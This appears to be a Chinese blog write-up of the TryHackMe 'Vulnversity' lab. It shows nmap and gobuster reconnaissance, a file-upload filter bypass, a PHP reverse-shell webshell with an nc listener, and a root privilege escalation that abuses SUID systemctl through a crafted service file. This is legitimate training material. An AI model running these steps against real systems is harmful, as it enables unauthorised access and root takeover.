@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="author" content="DMJ">
+<meta name="description" content="小学生">
+<title>靶机渗透测试 TryHackMe:Vulnversity - XEYE</title>
+<link rel="stylesheet" type="text/css" href="/css/main.css">
+</head>
+<body>
+<header>
+  <div>
+    <h1><a href="https://xeye.io/">XEYE</a></h1>
+  </div>
+  <nav><a href="/posts/">Posts</a><a href="/about/">About</a></nav>
+</header>
+<main>
+  <article>
+    <div class="title">
+  <h1>靶机渗透测试 TryHackMe:Vulnversity</h1>
+  </div>
+<div class="meta">
+  <div>2020-04-03 16:20</div>
+  </div>
+<div class="content">
+  <p><strong>0x00 前言</strong></p>
+<ul>
+<li>靶机名称：Vulnversity</li>
+<li>靶机简介：Vulnversity靶机主要学习主动侦查扫描，Web应用攻击和suid提权。</li>
+<li>攻击路径：端口扫描&ndash;&gt;Web目录爆破&ndash;&gt;文件上传漏洞利用&ndash;&gt;权限提升</li>
+<li>相关工具：nmap、gobuster、burpsuite、nc、webshell</li>
+<li>难度：容易</li>
+</ul>
+<p><strong>0x01 侦查</strong></p>
+<p><strong>1.nmap 扫描</strong></p>
+<pre><code>nmap -sV -sC -T4 -A 10.10.137.247 -oA 10.10.137.247.nmap
+
+☁  vulnversity  nmap -sV -sC -T4 -A 10.10.137.247 -oA 10.10.137.247.nmap             
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-19 19:39 CST
+Nmap scan report for 10.10.137.247
+Host is up (0.26s latency).
+Not shown: 972 closed ports
+PORT      STATE    SERVICE           VERSION
+21/tcp    open     ftp               vsftpd 3.0.3
+22/tcp    open     ssh               OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
+|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
+|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)
+139/tcp   open     netbios-ssn       Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+163/tcp   filtered cmip-man
+445/tcp   open     netbios-ssn       Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
+625/tcp   filtered apple-xsrvr-admin
+1001/tcp  filtered webpush
+1070/tcp  filtered gmrupdateserv
+1147/tcp  filtered capioverlan
+3128/tcp  open     http-proxy        Squid http proxy 3.5.12
+|_http-server-header: squid/3.5.12
+|_http-title: ERROR: The requested URL could not be retrieved
+3333/tcp  open     http              Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Vuln University
+3871/tcp  filtered avocent-adsap
+3878/tcp  filtered fotogcad
+4449/tcp  filtered privatewire
+5225/tcp  filtered hp-server
+6106/tcp  filtered isdninfo
+7002/tcp  filtered afs3-prserver
+8181/tcp  filtered intermapper
+8193/tcp  filtered sophos
+8652/tcp  filtered unknown
+9502/tcp  filtered unknown
+10012/tcp filtered unknown
+14441/tcp filtered unknown
+15002/tcp filtered onep-tls
+15003/tcp filtered unknown                                                                                                                                                                                                                 
+27352/tcp filtered unknown                                                                                                                                                                                                                 
+49155/tcp filtered unknown                                                                                                                                                                                                                 
+64623/tcp filtered unknown                                                                                                                                                                                                                 
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).                                                                                                                                        
+TCP/IP fingerprint:                                                                                                                                                                                                                        
+OS:SCAN(V=7.80%E=4%D=3/19%OT=21%CT=1%CU=32906%PV=Y%DS=2%DC=T%G=Y%TM=5E735A2                                                                                                                                                                
+OS:F%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=10D%TI=Z%CI=I%II=I%TS=8)OPS(                                                                                                                                                                
+OS:O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11                                                                                                                                                                
+OS:NW7%O6=M54DST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(                                                                                                                                                                
+OS:R=Y%DF=Y%T=40%W=6903%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS                                                                                                                                                                
+OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=                                                                                                                                                                
+OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=                                                                                                                                                                
+OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T                                                                                                                                                                
+OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=                                                                                                                                                                
+OS:S)                                                                                                                                                                                                                                      
+                                                                                                                                                                                                                                           
+Network Distance: 2 hops                                                                                                                                                                                                                   
+Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel                                                                                                                                                       
+                                                                                                                                                                                                                                           
+Host script results:                                                                                                                                                                                                                       
+|_clock-skew: mean: 1h20m22s, deviation: 2h18m34s, median: 21s
+|_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
+|   Computer name: vulnuniversity
+|   NetBIOS computer name: VULNUNIVERSITY\x00
+|   Domain name: \x00
+|   FQDN: vulnuniversity
+|_  System time: 2020-03-19T07:40:44-04:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2020-03-19T11:40:44
+|_  start_date: N/A
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT       ADDRESS
+1   539.50 ms 10.9.0.1
+2   539.58 ms 10.10.137.247
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 53.95 seconds
+</code></pre><p><strong>2. 查看端口开放服务和数量</strong></p>
+<pre><code>grep &quot;open&quot; 10.10.137.247.nmap.nmap
+21/tcp    open     ftp               vsftpd 3.0.3
+22/tcp    open     ssh               OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
+139/tcp   open     netbios-ssn       Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp   open     netbios-ssn       Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
+3128/tcp  open     http-proxy        Squid http proxy 3.5.12
+3333/tcp  open     http              Apache httpd 2.4.18 ((Ubuntu))
+
+grep &quot;open&quot; 10.10.137.247.nmap.nmap |wc -l
+6
+</code></pre><p><strong>0x02 Web目录爆破</strong></p>
+<pre><code>obuster项目地址：https://github.com/OJ/gobuster
+gobuster dir -u http://10.10.137.247:3333/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+</code></pre><p>发现上传页面</p>
+<pre><code>http://10.10.137.247:3333/internal/
+</code></pre><p><a href="https://user-images.githubusercontent.com/58038111/78397430-c9cfe780-7623-11ea-97b4-eeda9f020c25.png"><img src="https://user-images.githubusercontent.com/58038111/78397430-c9cfe780-7623-11ea-97b4-eeda9f020c25.png" alt="image"></a></p>
+<p><a href="https://user-images.githubusercontent.com/58038111/78397469-d7856d00-7623-11ea-8458-b4928f60e1a2.png"><img src="https://user-images.githubusercontent.com/58038111/78397469-d7856d00-7623-11ea-8458-b4928f60e1a2.png" alt="image"></a></p>
+<p><strong>0x03 穷举上传文件扩展名</strong></p>
+<p><a href="https://user-images.githubusercontent.com/58038111/78397548-03085780-7624-11ea-843e-4af58c7ac5be.png"><img src="https://user-images.githubusercontent.com/58038111/78397548-03085780-7624-11ea-843e-4af58c7ac5be.png" alt="image"></a></p>
+<p><a href="https://user-images.githubusercontent.com/58038111/78397689-3e0a8b00-7624-11ea-8f46-004de1cf9b54.png"><img src="https://user-images.githubusercontent.com/58038111/78397689-3e0a8b00-7624-11ea-8f46-004de1cf9b54.png" alt="image"></a></p>
+<p>设置Content-Type类型为php</p>
+<pre><code>Content-Type: application/x-php
+</code></pre><p>取消URL默认编码（Payload文件名中的&rdquo;.&ldquo;被URL编码会导致访问失败）</p>
+<pre><code>Burpsuite --&gt; Intruder --&gt; Payloads --&gt; Payload Encoding --&gt; BurpsuitePayload Encoding
+</code></pre><p><a href="https://user-images.githubusercontent.com/58038111/78397736-57abd280-7624-11ea-9864-4834a018a5c5.png"><img src="https://user-images.githubusercontent.com/58038111/78397736-57abd280-7624-11ea-9864-4834a018a5c5.png" alt="image"></a></p>
+<p>发现可以上传.phhtm</p>
+<p><a href="https://user-images.githubusercontent.com/58038111/78397762-61353a80-7624-11ea-80c0-a44063a0a825.png"><img src="https://user-images.githubusercontent.com/58038111/78397762-61353a80-7624-11ea-80c0-a44063a0a825.png" alt="image"></a></p>
+<h2 id="0x04-上传webshell">0x04 上传Webshell</h2>
+<pre><code>wget https://github.com/pentestmonkey/php-reverse-shell/raw/master/php-reverse-shell.php -O php-reverse-shell.phtml
+</code></pre><p>反弹IP修改为本机（攻击机）</p>
+<p><a href="https://user-images.githubusercontent.com/58038111/78397775-6a260c00-7624-11ea-843c-357f2b05af34.png"><img src="https://user-images.githubusercontent.com/58038111/78397775-6a260c00-7624-11ea-843c-357f2b05af34.png" alt="image"></a></p>
+<p><a href="https://user-images.githubusercontent.com/58038111/78397793-727e4700-7624-11ea-9429-ed2352309dda.png"><img src="https://user-images.githubusercontent.com/58038111/78397793-727e4700-7624-11ea-9429-ed2352309dda.png" alt="image"></a></p>
+<h2 id="0x04-反弹shell">0x04 反弹shell</h2>
+<p>本机NC监听1234端口</p>
+<pre><code> nc -lvnp 1234
+</code></pre><p>访问后门后获得shell，flag在用户目录下</p>
+<pre><code>$ cat /home/bill/user.txt
+8bd7992fxxxxxxxxxxxxxxxxxxxxxx
+</code></pre><p><a href="https://user-images.githubusercontent.com/58038111/78397841-8aee6180-7624-11ea-9fe0-a51017f5de30.png"><img src="https://user-images.githubusercontent.com/58038111/78397841-8aee6180-7624-11ea-9fe0-a51017f5de30.png" alt="image"></a></p>
+<h2 id="0x04-提权">0x04 提权</h2>
+<p>利用SUID提权，搜索所有SUID文件</p>
+<p><a href="https://user-images.githubusercontent.com/58038111/78397885-a0638b80-7624-11ea-8dae-c7ca889e8185.png"><img src="https://user-images.githubusercontent.com/58038111/78397885-a0638b80-7624-11ea-8dae-c7ca889e8185.png" alt="image"></a></p>
+<pre><code>$ find / -perm -4000 2&gt; /dev/null | xargs ls -lah
+-rwsr-xr-x 1 root   root        31K Jul 12  2016 /bin/fusermount
+-rwsr-xr-x 1 root   root        40K May 16  2018 /bin/mount
+-rwsr-xr-x 1 root   root       139K Jan 28  2017 /bin/ntfs-3g
+-rwsr-xr-x 1 root   root        44K May  7  2014 /bin/ping
+-rwsr-xr-x 1 root   root        44K May  7  2014 /bin/ping6
+-rwsr-xr-x 1 root   root        40K May 16  2017 /bin/su
+-rwsr-xr-x 1 root   root       645K Feb 13  2019 /bin/systemctl
+-rwsr-xr-x 1 root   root        27K May 16  2018 /bin/umount
+-rwsr-xr-x 1 root   root        35K Mar  6  2017 /sbin/mount.cifs
+-rwsr-sr-x 1 daemon daemon      51K Jan 14  2016 /usr/bin/at
+-rwsr-xr-x 1 root   root        49K May 16  2017 /usr/bin/chfn
+-rwsr-xr-x 1 root   root        40K May 16  2017 /usr/bin/chsh
+-rwsr-xr-x 1 root   root        74K May 16  2017 /usr/bin/gpasswd
+-rwsr-xr-x 1 root   root        33K May 16  2017 /usr/bin/newgidmap
+-rwsr-xr-x 1 root   root        39K May 16  2017 /usr/bin/newgrp
+-rwsr-xr-x 1 root   root        33K May 16  2017 /usr/bin/newuidmap
+-rwsr-xr-x 1 root   root        53K May 16  2017 /usr/bin/passwd
+-rwsr-xr-x 1 root   root        23K Jan 15  2019 /usr/bin/pkexec
+-rwsr-xr-x 1 root   root       134K Jul  4  2017 /usr/bin/sudo
+-rwsr-xr-- 1 root   messagebus  42K Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root   root        10K Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x 1 root   root       419K Jan 31  2019 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root   root        15K Jan 15  2019 /usr/lib/policykit-1/polkit-agent-helper-1
+-rwsr-sr-x 1 root   root        97K Jan 29  2019 /usr/lib/snapd/snap-confine
+-rwsr-xr-x 1 root   root        75K Jul 17 11:22 /usr/lib/squid/pinger
+-rwsr-xr-x 1 root   root        3
+</code></pre><p><a href="https://user-images.githubusercontent.com/58038111/78397938-bd985a00-7624-11ea-8ec2-acb884811b74.png"><img src="https://user-images.githubusercontent.com/58038111/78397938-bd985a00-7624-11ea-8ec2-acb884811b74.png" alt="image"></a></p>
+<p>我们看到靶机系统允许所有登陆用户创建系统服务并以root权限运行，systemctl用于控制systemd初始化服务的工具。</p>
+<pre><code>xxx=$(mktemp).service 
+//创建一个名为xxx的环境变量，调用mktemp创建一个临时的systemd服务配置文件
+                                 
+echo '[Service]
+ExecStart=/bin/sh -c &quot;cat /root/root.txt &gt; /tmp/output&quot;
+[Install]
+WantedBy=multi-user.target' &gt; $xxx
+//将配置内容写入环境变量，服务执行后通过root权限去读flag文件。
+
+/bin/systemctl link $xxx
+/bin/systemctl enable --now $xxx
+//链接服务并启动
+
+
+cat /tmp/output
+a58ffxxxxxxxxxxxxxxxxxxx
+//获得root flag
+</code></pre><p><a href="https://user-images.githubusercontent.com/58038111/78397966-d0ab2a00-7624-11ea-8767-ea046bc138e5.png"><img src="https://user-images.githubusercontent.com/58038111/78397966-d0ab2a00-7624-11ea-8767-ea046bc138e5.png" alt="image"></a></p>
+<p>systemctl提权参考GTFOBins项目文章：https://gtfobins.github.io/gtfobins/systemctl/#suid</p>
+</div>
+
+  </article>
+</main>
+<footer>
+  <div>
+    <div>&copy; 2019 XEYE <a href="https://creativecommons.org/licenses/by/4.0/deed.zh">CC-BY-4.0</a></div>
+  </div>
+</footer>
+</body>
+</html>
